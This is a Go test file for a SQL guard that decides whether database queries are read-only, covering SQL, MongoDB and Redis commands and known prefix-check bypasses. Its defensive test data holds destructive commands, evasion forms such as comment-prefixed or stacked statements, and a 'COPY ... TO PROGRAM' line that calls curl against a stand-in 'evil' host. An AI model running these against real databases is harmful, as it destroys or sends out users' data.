/*
 * Copyright 2026 Clidey, Inc.
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *     http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */

package sqlguard

import "testing"

func TestClassifyType(t *testing.T) {
	cases := []struct {
		name     string
		query    string
		expected StatementType
	}{
		{"select", "SELECT * FROM users", StatementSelect},
		{"select lowercase", "select id from users", StatementSelect},
		{"select with whitespace", "  SELECT id FROM users", StatementSelect},
		{"insert", "INSERT INTO users VALUES (1)", StatementInsert},
		{"update", "UPDATE users SET name='bob'", StatementUpdate},
		{"delete", "DELETE FROM users WHERE id=1", StatementDelete},
		{"drop table", "DROP TABLE users", StatementDrop},
		{"create table", "CREATE TABLE users (id int)", StatementCreate},
		{"alter table", "ALTER TABLE users ADD col int", StatementAlter},
		{"truncate", "TRUNCATE TABLE users", StatementTruncate},
		{"show", "SHOW TABLES", StatementShow},
		{"describe", "DESCRIBE users", StatementDescribe},
		{"desc shorthand", "DESC users", StatementDescribe},
		{"explain", "EXPLAIN SELECT * FROM users", StatementExplain},
		{"with cte", "WITH cte AS (SELECT 1) SELECT * FROM cte", StatementWith},
		{"grant", "GRANT ALL ON users TO admin", StatementGrant},
		{"merge", "MERGE INTO t USING s ON t.id=s.id", StatementMerge},
		{"set", "SET ROLE admin", StatementSet},
		{"copy", "COPY t FROM '/tmp/x'", StatementCopy},
		{"call", "CALL p()", StatementCall},
		{"do", "DO $$ BEGIN END $$", StatementDo},
		{"gibberish", "flurb the wibble", StatementUnknown},
	}

	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			if got := Classify(tc.query).Type; got != tc.expected {
				t.Errorf("Classify(%q).Type = %v, want %v", tc.query, got, tc.expected)
			}
		})
	}
}

// TestClassifyMutating covers the prefix-matching bypasses that previously let
// writes through the read-only and confirmation gates.
func TestClassifyMutating(t *testing.T) {
	cases := []struct {
		name     string
		query    string
		mutating bool
	}{
		// Reads
		{"select", "SELECT * FROM users", false},
		{"select lowercase", "select * from users", false},
		{"select leading spaces", "  SELECT * FROM users", false},
		{"show", "SHOW TABLES", false},
		{"describe", "DESCRIBE users", false},
		{"explain select", "EXPLAIN SELECT * FROM users", false},
		{"explain analyze select", "EXPLAIN ANALYZE SELECT * FROM users", false},
		{"read-only cte", "WITH c AS (SELECT 1) SELECT * FROM c", false},
		{"pragma read", "PRAGMA table_info(users)", false},
		{"use database", "USE analytics", false},
		{"identifier containing keyword", "SELECT backdrop FROM stages", false},
		{"keyword inside string literal", "SELECT 'DROP TABLE users' AS note", false},
		{"keyword inside quoted identifier", `SELECT "delete" FROM audit`, false},
		{"values list", "VALUES (1), (2)", false},

		// Writes by leading verb
		{"insert", "INSERT INTO users (name) VALUES ('alice')", true},
		{"insert lowercase", "insert into users (name) values ('alice')", true},
		{"insert mixed case", "Insert Into users (name) values ('alice')", true},
		{"insert leading spaces", "  INSERT INTO users VALUES (1)", true},
		{"insert leading newline", "\n INSERT INTO users VALUES (1)", true},
		{"insert tab", "\tINSERT INTO users VALUES (1)", true},
		{"update", "UPDATE users SET name = 'bob'", true},
		{"delete", "DELETE FROM users WHERE id = 1", true},
		{"drop table", "DROP TABLE users", true},
		{"drop database", "DROP DATABASE test", true},
		{"alter table", "ALTER TABLE users ADD COLUMN age INT", true},
		{"create table", "CREATE TABLE users (id INT)", true},
		{"create index", "CREATE INDEX idx ON users(name)", true},
		{"truncate", "TRUNCATE TABLE users", true},
		{"grant", "GRANT SELECT ON users TO reader", true},
		{"revoke", "REVOKE SELECT ON users FROM reader", true},

		// Bypasses the old prefix check missed
		{"line comment before delete", "-- harmless\nDELETE FROM t", true},
		{"hash comment before delete", "# harmless\nDELETE FROM t", true},
		{"block comment before drop", "/* harmless */ DROP TABLE t", true},
		{"tab-separated drop", "DROP\tTABLE users", true},
		{"newline-separated drop", "DROP\nTABLE users", true},
		{"writable cte", "WITH d AS (DELETE FROM users RETURNING *) SELECT count(*) FROM d", true},
		{"writable cte insert", "WITH c AS (SELECT 1) INSERT INTO t SELECT * FROM c", true},
		{"merge", "MERGE INTO t USING s ON t.id=s.id WHEN MATCHED THEN DELETE", true},
		{"grant leading paren", "(GRANT ALL ON users TO bob)", true},
		{"leading semicolon delete", ";DELETE FROM t", true},
		{"trailing statement drop", "SELECT 1; DROP TABLE t", true},
		{"set role", "SET ROLE admin", true},
		{"copy from", "COPY t FROM '/tmp/in.csv'", true},
		{"copy to program", "COPY (SELECT 1) TO PROGRAM 'curl http://evil'", true},
		{"call procedure", "CALL do_something()", true},
		{"do block", "DO $$ BEGIN DELETE FROM users; END $$", true},
		{"explain analyze write", "EXPLAIN ANALYZE UPDATE users SET admin=true", true},
		{"bare analyze", "ANALYZE users", true},
		{"vacuum", "VACUUM FULL users", true},
		{"lock table", "LOCK TABLE users", true},
		{"pragma assignment", "PRAGMA journal_mode = WAL", true},
		{"unknown statement fails closed", "FLURB the wibble", true},
		{"empty is not mutating but unknown", "", false},
	}

	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			cls := Classify(tc.query)
			if cls.Mutating != tc.mutating {
				t.Errorf("Classify(%q).Mutating = %v (reason %q), want %v", tc.query, cls.Mutating, cls.Reason, tc.mutating)
			}
			if cls.Mutating && cls.Reason == "" {
				t.Errorf("Classify(%q) reported mutating with no reason", tc.query)
			}
		})
	}
}

// TestClassifyPlainExplainIsRead pins that plain EXPLAIN over a write does not
// execute it, so it stays read-only while EXPLAIN ANALYZE does not.
func TestClassifyPlainExplainIsRead(t *testing.T) {
	if Classify("EXPLAIN UPDATE users SET admin=true").Mutating {
		t.Error("plain EXPLAIN does not execute the statement; expected read-only")
	}
	if !Classify("EXPLAIN ANALYZE UPDATE users SET admin=true").Mutating {
		t.Error("EXPLAIN ANALYZE executes the statement; expected mutating")
	}
}

func TestClassifyMultiStatement(t *testing.T) {
	cases := []struct {
		name  string
		query string
		multi bool
	}{
		{"single", "SELECT * FROM users", false},
		{"trailing semicolon", "SELECT * FROM users;", false},
		{"trailing semicolons and space", "SELECT * FROM users; ", false},
		{"two selects", "SELECT 1; SELECT 2", true},
		{"select then drop", "SELECT 1; DROP TABLE users", true},
		{"semicolon inside string is not multi", "SELECT 'a;b' FROM users", false},
		{"semicolon inside comment is not multi", "SELECT 1 -- a;b", false},
		{"semicolon inside dollar block is not multi", "DO $$ BEGIN DELETE FROM t; END $$", false},
	}

	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			if got := Classify(tc.query).MultiStatement; got != tc.multi {
				t.Errorf("Classify(%q).MultiStatement = %v, want %v", tc.query, got, tc.multi)
			}
		})
	}
}

func TestOperationName(t *testing.T) {
	cases := []struct {
		query    string
		expected string
	}{
		{"SELECT 1", "get"},
		{"SHOW TABLES", "get"},
		{"INSERT INTO t VALUES (1)", "insert"},
		{"UPDATE t SET x=1", "update"},
		{"DELETE FROM t", "delete"},
		{"DROP TABLE t", "drop"},
		{"-- x\nDELETE FROM t", "delete"},
		{"FLURB wibble", "execute"},
	}
	for _, tc := range cases {
		if got := OperationName(Classify(tc.query)); got != tc.expected {
			t.Errorf("OperationName(Classify(%q)) = %q, want %q", tc.query, got, tc.expected)
		}
	}
}

func TestIsReadOnly(t *testing.T) {
	if !IsReadOnly("SELECT 1") {
		t.Error("SELECT should be read-only")
	}
	if IsReadOnly("DELETE FROM t") {
		t.Error("DELETE should not be read-only")
	}
}

func TestIsReadOnlyStatementAndIsWriteStatement(t *testing.T) {
	if !IsReadOnlyStatement(StatementSelect) || !IsReadOnlyStatement(StatementShow) {
		t.Error("SELECT and SHOW should be read-only statement types")
	}
	if IsReadOnlyStatement(StatementInsert) || IsReadOnlyStatement(StatementDelete) {
		t.Error("INSERT and DELETE should not be read-only statement types")
	}
	if IsWriteStatement(StatementSelect) {
		t.Error("SELECT should not be a write statement")
	}
	for _, st := range []StatementType{StatementInsert, StatementUpdate, StatementDelete, StatementDrop} {
		if !IsWriteStatement(st) {
			t.Errorf("%v should be a write statement", st)
		}
	}
}

func TestContainsKeyword(t *testing.T) {
	if !ContainsKeyword("SELECT 1; DROP TABLE x", "DROP") {
		t.Error("expected DROP to be found in a batch")
	}
	if ContainsKeyword("SELECT backdrop FROM stages", "DROP") {
		t.Error("did not expect DROP to match inside an identifier")
	}
	if ContainsKeyword("SELECT 'DROP TABLE x'", "DROP") {
		t.Error("did not expect DROP to match inside a string literal")
	}
}

func TestClassifyCommandMongo(t *testing.T) {
	cases := []struct {
		command  string
		mutating bool
	}{
		{"db.users.find({})", false},
		{"db.users.findOne({})", false},
		{"db.users.countDocuments({})", false},
		{"db.users.aggregate([])", false},
		{"db.users.distinct('name')", false},
		{"db.users.insertOne({})", true},
		{"db.users.insertMany([])", true},
		{"db.users.updateOne({}, {})", true},
		{"db.users.deleteMany({})", true},
		{"db.users.drop()", true},
		{"db.dropDatabase()", true},
		{"db.users.createIndex({})", true},
		{"db.users.bulkWrite([])", true},
		{"not a command", true},
	}
	for _, tc := range cases {
		cls := ClassifyCommand("mongodb", tc.command)
		if cls.Mutating != tc.mutating {
			t.Errorf("ClassifyCommand(mongodb, %q).Mutating = %v (reason %q), want %v", tc.command, cls.Mutating, cls.Reason, tc.mutating)
		}
	}
}

func TestClassifyCommandRedis(t *testing.T) {
	cases := []struct {
		command  string
		mutating bool
	}{
		{"GET key", false},
		{"get key", false},
		{"HGETALL hash", false},
		{"SCAN 0", false},
		{"INFO", false},
		{"CONFIG GET maxmemory", false},
		{"SET key value", true},
		{"DEL key", true},
		{"FLUSHALL", true},
		{"EVAL \"return 1\" 0", true},
		{"CONFIG SET appendonly no", true},
		{"CLIENT KILL ID 1", true},
		{"MEMORY PURGE", true},
		{"SHUTDOWN", true},
		{"", true},
	}
	for _, tc := range cases {
		cls := ClassifyCommand("redis", tc.command)
		if cls.Mutating != tc.mutating {
			t.Errorf("ClassifyCommand(redis, %q).Mutating = %v (reason %q), want %v", tc.command, cls.Mutating, cls.Reason, tc.mutating)
		}
	}
}

// TestClassifyCommandFallsBackToSQL pins that a source type with no command
// dialect is classified as SQL rather than silently reported as a read.
func TestClassifyCommandFallsBackToSQL(t *testing.T) {
	if !ClassifyCommand("postgres", "DELETE FROM t").Mutating {
		t.Error("expected SQL fallback to classify DELETE as mutating")
	}
	if ClassifyCommand("postgres", "SELECT 1").Mutating {
		t.Error("expected SQL fallback to classify SELECT as read-only")
	}
	if !ClassifyCommand("", "DROP TABLE t").Mutating {
		t.Error("expected empty source type to fall back to SQL classification")
	}
}
